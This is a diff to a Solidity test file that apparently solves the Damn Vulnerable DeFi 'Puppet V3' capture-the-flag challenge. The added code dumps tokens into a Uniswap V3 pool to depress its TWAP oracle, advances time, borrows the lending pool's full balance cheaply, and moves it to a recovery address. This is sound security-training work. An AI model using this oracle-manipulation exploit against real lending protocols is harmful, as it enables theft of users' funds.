@@ -10,6 +10,7 @@ import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
+import {ISwapRouter} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
 
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -119,8 +120,38 @@ contract PuppetV3Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV3() public checkSolvedByPlayer {
-        
+        address uniswapRouterAddress = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
+        token.approve(uniswapRouterAddress, type(uint256).max);
+
+        ISwapRouter(uniswapRouterAddress).exactInputSingle(
+        ISwapRouter.ExactInputSingleParams({
+            tokenIn: address(token),
+            tokenOut: address(weth),
+            fee: 3000,
+            recipient: address(player),
+            deadline: block.timestamp,
+            amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
+            amountOutMinimum: 0,
+            sqrtPriceLimitX96: 0
+            })
+        );
+        vm.warp(block.timestamp + 114);
+        uint256 quote = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        weth.approve(address(lendingPool), quote);
+        console.log("quote: ", quote);
+
+        lendingPool.borrow(1_000_000e18);
+
+        (bool pwned,) = address(token).call(
+            abi.encodeWithSignature(
+                "transfer(address,uint256)",
+                recovery, 1_000_000e18
+            )
+        );
+
+        require(pwned, "Ahh bruh! u fucked up at last step dude!");
     }
+
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
